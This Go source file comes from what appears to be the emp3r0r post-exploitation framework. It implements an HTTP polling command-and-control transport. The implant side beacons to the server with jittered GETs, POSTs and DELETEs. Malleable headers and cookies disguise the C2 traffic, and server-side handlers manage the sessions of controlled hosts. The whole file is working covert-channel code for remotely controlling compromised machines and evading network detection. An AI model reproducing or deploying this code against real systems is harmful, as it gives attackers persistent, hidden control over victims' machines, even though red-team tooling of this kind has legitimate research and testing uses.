package transport

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ErrPollingRequest is used internally to tell the server mux not to treat a request as a new stream.
var ErrPollingRequest = errors.New("is generic polling request")

// HTTPChannelWrapper implements the plain HTTP stateless C2 transport.
type HTTPChannelWrapper struct {
	Config       *def.MalleableHTTPConfig
	PollInterval int
	Jitter       int
}

// HTTPClientStream proxy reads to GETs and writes to POSTs.
type HTTPClientStream struct {
	client       *http.Client
	url          string
	sessionID    string
	config       *def.MalleableHTTPConfig
	pollInterval int
	jitter       int

	// For reading we use a buffer filled by the polling loop
	readBuf []byte
	readMu  sync.Mutex
	readCh  chan []byte

	writeInFlight int32

	ctx    context.Context
	cancel context.CancelFunc
}

func setMalleableHeader(h http.Header, name, value, sessionID string) {
	if name == "" || value == "" {
		return
	}
	val := value
	if strings.Contains(value, "%s") {
		val = fmt.Sprintf(value, sessionID)
	}

	if strings.EqualFold(name, "Cookie") {
		existing := h.Get("Cookie")
		if existing != "" {
			h.Set("Cookie", existing+"; "+val)
		} else {
			h.Set("Cookie", val)
		}
	} else {
		h.Set(name, val)
	}
}

func applyMalleableConfig(req *http.Request, config *def.MalleableHTTPConfig, sessionID string) {
	if config == nil {
		return
	}
	// Custom static headers
	for k, v := range config.CustomHeaders {
		req.Header.Set(k, v)
	}
	// Session ID
	setMalleableHeader(req.Header, config.SessionHeader, config.SessionValue, sessionID)
}

func (h HTTPChannelWrapper) Dial(ctx context.Context, client *http.Client, url string) (io.ReadWriteCloser, *http.Response, error) {
	sessionID := uuid.NewString()

	stream := &HTTPClientStream{
		client:       client,
		url:          url,
		sessionID:    sessionID,
		readCh:       make(chan []byte, 100),
		config:       h.Config,
		pollInterval: h.PollInterval,
		jitter:       h.Jitter,
	}
	stream.ctx, stream.cancel = context.WithCancel(ctx)

	// Build URL with Malleable path
	u := url
	if h.Config != nil && h.Config.C2Path != "" {
		if !strings.HasSuffix(u, "/") && !strings.HasPrefix(h.Config.C2Path, "/") {
			u += "/"
		}
		u += h.Config.C2Path
	}

	// Send initialization POST to server to establish virtual stream
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, u, nil)
	if err != nil {
		stream.cancel()
		return nil, nil, err
	}
	applyMalleableConfig(req, h.Config, sessionID)
	if h.Config != nil {
		setMalleableHeader(req.Header, h.Config.InitHeader, h.Config.InitValue, sessionID)
	}

	resp, err := client.Do(req)
	if err != nil {
		stream.cancel()
		return nil, nil, err
	}
	if resp.StatusCode != http.StatusOK {
		stream.cancel()
		return nil, nil, fmt.Errorf("bad status on init: %d", resp.StatusCode)
	}
	// no body needed, discard
	_ = resp.Body.Close()

	// Start GET polling loop
	go stream.pollRead()

	return stream, resp, nil
}

func (h HTTPChannelWrapper) Accept(w http.ResponseWriter, req *http.Request) (io.ReadWriteCloser, error) {
	// Accept is bypassed by CC's dedicated HTTP server for `http_poll`.
	return nil, errors.New("Accept is not implemented for HTTPChannelWrapper; please use HandleHTTPSession on the server")
}

func (s *HTTPClientStream) pollRead() {
	defer s.cancel()
	u := s.url
	if s.config != nil && s.config.C2Path != "" {
		if !strings.HasSuffix(u, "/") && !strings.HasPrefix(s.config.C2Path, "/") {
			u += "/"
		}
		u += s.config.C2Path
	}
	for s.ctx.Err() == nil {
		gotData := false
		req, err := http.NewRequestWithContext(s.ctx, http.MethodGet, u, nil)
		if err != nil {
			time.Sleep(1 * time.Second)
			continue
		}
		applyMalleableConfig(req, s.config, s.sessionID)
		resp, err := s.client.Do(req)
		if err != nil {
			time.Sleep(1 * time.Second)
			continue
		}
		switch resp.StatusCode {
		case http.StatusOK:
			// Read in chunks to handle large bodies and prevent memory issues
			// This also ensures we don't discard data if the transfer is large
			buf := make([]byte, 1024*1024) // 1MB chunks
			for {
				n, rErr := resp.Body.Read(buf)
				if n > 0 {
					chunk := make([]byte, n)
					copy(chunk, buf[:n])
					select {
					case s.readCh <- chunk:
						gotData = true
					case <-s.ctx.Done():
						resp.Body.Close()
						return
					}
				}
				if rErr != nil {
					if rErr != io.EOF {
						logging.Errorf("HTTPClientStream: pollRead body read error: %v", rErr)
					}
					break
				}
			}
			resp.Body.Close()
		case http.StatusNotFound:
			resp.Body.Close()
			if atomic.LoadInt32(&s.writeInFlight) > 0 {
				continue
			}
			return
		default:
			resp.Body.Close()
		}

		// Calculate sleep interval (CS-style: interval - rand(interval * jitter / 100))
		// Range: [interval*(1-jitter/100), interval]
		interval := 10 // Safe default (seconds)
		if s.pollInterval > 0 {
			interval = s.pollInterval
		}
		jitter := 20 // Default jitter
		if s.jitter > 0 {
			jitter = s.jitter
		}

		// Baseline sleep
		sleepMs := interval * 1000
		if jitter > 0 {
			maxJitterMs := (sleepMs * jitter) / 100
			if maxJitterMs > 0 {
				sleepMs -= util.RandInt(0, maxJitterMs)
			}
		}

		// If we just got data, don't sleep for the full interval
		// Instead, perform a short "blink" to pull the rest of the stream
		if gotData {
			select {
			case <-time.After(100 * time.Millisecond):
				continue
			case <-s.ctx.Done():
				return
			}
		}

		select {
		case <-time.After(time.Duration(sleepMs) * time.Millisecond):
		case <-s.ctx.Done():
			return
		}
	}
}

func (s *HTTPClientStream) Read(p []byte) (n int, err error) {
	s.readMu.Lock()
	defer s.readMu.Unlock()

	// If we have existing buffered data, consume it
	if len(s.readBuf) > 0 {
		n = copy(p, s.readBuf)
		s.readBuf = s.readBuf[n:]
		return n, nil
	}

	// Wait for new data from polling
	select {
	case <-s.ctx.Done():
		return 0, io.EOF
	case data, ok := <-s.readCh:
		if !ok {
			return 0, io.EOF
		}
		n = copy(p, data)
		if n < len(data) {
			s.readBuf = append(s.readBuf, data[n:]...)
		}
		return n, nil
	}
}

func (s *HTTPClientStream) Write(p []byte) (n int, err error) {
	if s.ctx.Err() != nil {
		return 0, s.ctx.Err()
	}
	atomic.AddInt32(&s.writeInFlight, 1)
	defer atomic.AddInt32(&s.writeInFlight, -1)

	u := s.url
	if s.config != nil && s.config.C2Path != "" {
		if !strings.HasSuffix(u, "/") && !strings.HasPrefix(s.config.C2Path, "/") {
			u += "/"
		}
		u += s.config.C2Path
	}

	req, err := http.NewRequestWithContext(s.ctx, http.MethodPost, u, bytes.NewBuffer(p))
	if err != nil {
		return 0, fmt.Errorf("new request: %v", err)
	}
	applyMalleableConfig(req, s.config, s.sessionID)

	resp, err := s.client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, err
	}

	if resp.StatusCode != http.StatusOK {
		return 0, fmt.Errorf("write rejected by server: %d", resp.StatusCode)
	}

	if len(body) > 0 {
		select {
		case s.readCh <- body:
		case <-s.ctx.Done():
			return 0, s.ctx.Err()
		}
	}

	return len(p), nil
}

func (s *HTTPClientStream) Close() error {
	s.cancel()

	u := s.url
	if s.config != nil && s.config.C2Path != "" {
		if !strings.HasSuffix(u, "/") && !strings.HasPrefix(s.config.C2Path, "/") {
			u += "/"
		}
		u += s.config.C2Path
	}

	// Notify server to teardown the virtual session
	req, _ := http.NewRequest(http.MethodDelete, u, nil)
	applyMalleableConfig(req, s.config, s.sessionID)
	if s.config != nil {
		setMalleableHeader(req.Header, s.config.CloseHeader, s.config.CloseValue, s.sessionID)
	}
	// Fire and forget
	go func() {
		if resp, err := s.client.Do(req); err == nil {
			resp.Body.Close()
		}
	}()
	return nil
}

// ----------------------------------------------------
// Server Side Helpers
// ----------------------------------------------------

var serverSessions sync.Map

// HTTPServerStream is the virtual stream returned to CC
type HTTPServerStream struct {
	sessionID    string
	readBuf      []byte
	readCh       chan []byte
	writeCh      chan []byte
	ctx          context.Context
	cancel       context.CancelFunc
	readMu       sync.Mutex
	writeMu      sync.Mutex
	lastActivity time.Time
	activityMu   sync.Mutex
	closing      int32
}

func newHTTPServerStream(sessionID string) *HTTPServerStream {
	ctx, cancel := context.WithCancel(context.Background())
	s := &HTTPServerStream{
		sessionID:    sessionID,
		readCh:       make(chan []byte, 100),
		writeCh:      make(chan []byte, 100),
		ctx:          ctx,
		cancel:       cancel,
		lastActivity: time.Now(),
	}

	// Timeout zombie sessions
	go func() {
		for {
			select {
			case <-s.ctx.Done():
				return
			case <-time.After(5 * time.Second):
				// Check for session timeout
				s.activityMu.Lock()
				idle := time.Since(s.lastActivity)
				s.activityMu.Unlock()
				if idle > 10*time.Minute {
					logging.Warningf("HTTPServerStream: session %s timed out after %v", s.sessionID, idle)
					serverSessions.Delete(s.sessionID)
					s.Close()
					return
				}
			}
		}
	}()

	serverSessions.Store(sessionID, s)
	return s
}

func (s *HTTPServerStream) isClosing() bool {
	return atomic.LoadInt32(&s.closing) == 1
}

func HandleHTTPServerSession(w http.ResponseWriter, req *http.Request, config *def.MalleableHTTPConfig) (stream *HTTPServerStream, err error) {
	if config == nil {
		return nil, errors.New("HandleHTTPServerSession: missing malleable config")
	}

	// Parse Session ID
	sessionID := ""
	if strings.EqualFold(config.SessionHeader, "Cookie") {
		c2_cookie, cookieErr := req.Cookie(strings.Split(config.SessionValue, "=")[0])
		if cookieErr == nil {
			sessionID = c2_cookie.Value
		}
	} else {
		sessionID = req.Header.Get(config.SessionHeader)
	}

	if sessionID == "" {
		return nil, ErrPollingRequest
	}

	// Check Init
	isInit := false
	if strings.EqualFold(config.InitHeader, "Cookie") {
		c2_cookie, cookieErr := req.Cookie(strings.Split(config.InitValue, "=")[0])
		if cookieErr == nil && c2_cookie.Value == strings.Split(config.InitValue, "=")[1] {
			isInit = true
		}
	} else {
		isInit = req.Header.Get(config.InitHeader) == config.InitValue
	}

	if isInit {
		logging.Debugf("HandleHTTPServerSession: init session %s", sessionID)
		stream = newHTTPServerStream(sessionID)
		w.WriteHeader(http.StatusOK)
		return stream, nil
	}

	// Check Close
	isClose := false
	if strings.EqualFold(config.CloseHeader, "Cookie") || req.Method == http.MethodDelete {
		if req.Method == http.MethodDelete {
			isClose = true
		} else {
			c2_cookie, cookieErr := req.Cookie(strings.Split(config.CloseValue, "=")[0])
			if cookieErr == nil && c2_cookie.Value == strings.Split(config.CloseValue, "=")[1] {
				isClose = true
			}
		}
	} else {
		isClose = req.Header.Get(config.CloseHeader) == config.CloseValue
	}

	if isClose {
		logging.Debugf("HandleHTTPServerSession: closing session %s", sessionID)
		if val, ok := serverSessions.Load(sessionID); ok {
			stream = val.(*HTTPServerStream)
			stream.Close()
		}
		w.WriteHeader(http.StatusOK)
		return nil, ErrPollingRequest
	}

	// It's a polling request
	val, ok := serverSessions.Load(sessionID)
	if !ok {
		http.Error(w, "invalid session", http.StatusNotFound)
		return nil, ErrPollingRequest
	}
	stream = val.(*HTTPServerStream)
	if stream.isClosing() && req.Method != http.MethodGet {
		http.Error(w, "invalid session", http.StatusNotFound)
		return nil, ErrPollingRequest
	}

	stream.activityMu.Lock()
	stream.lastActivity = time.Now()
	stream.activityMu.Unlock()

	switch req.Method {
	case http.MethodGet:
		if stream.isClosing() && len(stream.writeCh) == 0 {
			serverSessions.Delete(stream.sessionID)
			http.Error(w, "invalid session", http.StatusNotFound)
			return nil, ErrPollingRequest
		}
		// Client is reading from us
		pollTimeout := 50 * time.Second
		if stream.isClosing() {
			pollTimeout = 500 * time.Millisecond
		}
		select {
		case <-req.Context().Done():
		case data := <-stream.writeCh:
			w.WriteHeader(http.StatusOK)
			if _, err := w.Write(data); err != nil {
				return nil, ErrPollingRequest
			}
			// Drain any additional buffered data to send in the same response
			// We cap the total size to avoid massive responses that might be unstable
			totalWritten := len(data)
		loop:
			for totalWritten < 50*1024*1024 { // Cap at 50MB per polling response
				select {
				case more, ok := <-stream.writeCh:
					if !ok {
						break loop
					}
					n, err := w.Write(more)
					if err != nil {
						break loop
					}
					totalWritten += n
				default:
					break loop
				}
			}
			return nil, ErrPollingRequest
		case <-time.After(pollTimeout):
			if stream.isClosing() {
				serverSessions.Delete(stream.sessionID)
				http.Error(w, "invalid session", http.StatusNotFound)
				return nil, ErrPollingRequest
			}
			// Timeout, return empty 200 OK so client polls again
			w.WriteHeader(http.StatusOK)
			return nil, ErrPollingRequest
		}
	case http.MethodPost:
		// Client is writing to us
		limitReader := http.MaxBytesReader(w, req.Body, 50*1024*1024)
		data, err := io.ReadAll(limitReader)
		if err != nil {
			logging.Warningf("HandleHTTPServerSession POST: read body: %v", err)
			http.Error(w, "request too large or read failed", http.StatusRequestEntityTooLarge)
			return nil, ErrPollingRequest
		}
		if len(data) > 0 {
			select {
			case stream.readCh <- data:
				w.WriteHeader(http.StatusOK)
			case <-time.After(5 * time.Second):
				http.Error(w, "buffer full", http.StatusServiceUnavailable)
			}
		} else {
			w.WriteHeader(http.StatusOK)
		}
		return nil, ErrPollingRequest
	}

	return nil, ErrPollingRequest
}

func (s *HTTPServerStream) Read(p []byte) (n int, err error) {
	s.readMu.Lock()
	defer s.readMu.Unlock()

	if len(s.readBuf) > 0 {
		n = copy(p, s.readBuf)
		s.readBuf = s.readBuf[n:]
		return n, nil
	}

	select {
	case data, ok := <-s.readCh:
		if !ok {
			return 0, io.EOF
		}
		n = copy(p, data)
		if n < len(data) {
			s.readBuf = append(s.readBuf, data[n:]...)
		}
		return n, nil
	case <-s.ctx.Done():
		// Check if there is anything left in readCh before giving up
		select {
		case data, ok := <-s.readCh:
			if !ok {
				return 0, io.EOF
			}
			n = copy(p, data)
			if n < len(data) {
				s.readBuf = append(s.readBuf, data[n:]...)
			}
			return n, nil
		default:
			return 0, io.EOF
		}
	}
}

func (s *HTTPServerStream) Write(p []byte) (n int, err error) {
	if s.ctx.Err() != nil {
		return 0, s.ctx.Err()
	}

	// We must allocate a new buffer as 'p' might be mutated by caller after we exit
	buf := make([]byte, len(p))
	copy(buf, p)

	select {
	case <-s.ctx.Done():
		return 0, s.ctx.Err()
	case s.writeCh <- buf:
		return len(p), nil
	case <-time.After(30 * time.Second): // Backpressure so we don't block forever
		return 0, fmt.Errorf("write timeout: client not pulling")
	}
}

func (s *HTTPServerStream) Close() error {
	if !atomic.CompareAndSwapInt32(&s.closing, 0, 1) {
		return nil
	}
	s.cancel()
	go func(sessionID string) {
		defer func() {
			if r := recover(); r != nil {
				logging.Errorf("HTTPServerStream: deferred cleanup panic for %s: %v", sessionID, r)
			}
		}()
		<-time.After(5 * time.Second)
		serverSessions.Delete(sessionID)
	}(s.sessionID)
	return nil
}

func IsActiveHTTPServerSession(req *http.Request, config *def.MalleableHTTPConfig) bool {
	if config == nil {
		return false
	}
	sessionID := ""
	if strings.EqualFold(config.SessionHeader, "Cookie") {
		c2_cookie, cookieErr := req.Cookie(strings.Split(config.SessionValue, "=")[0])
		if cookieErr == nil {
			sessionID = c2_cookie.Value
		}
	} else {
		sessionID = req.Header.Get(config.SessionHeader)
	}
	if sessionID == "" {
		return false
	}
	_, exists := serverSessions.Load(sessionID)
	return exists
}

func init() {
	RegisterC2Channel("http_poll", "HTTP/1.1 stateless polling wrapper. Use `https://` to enable TLS", &HTTPChannelWrapper{})
}

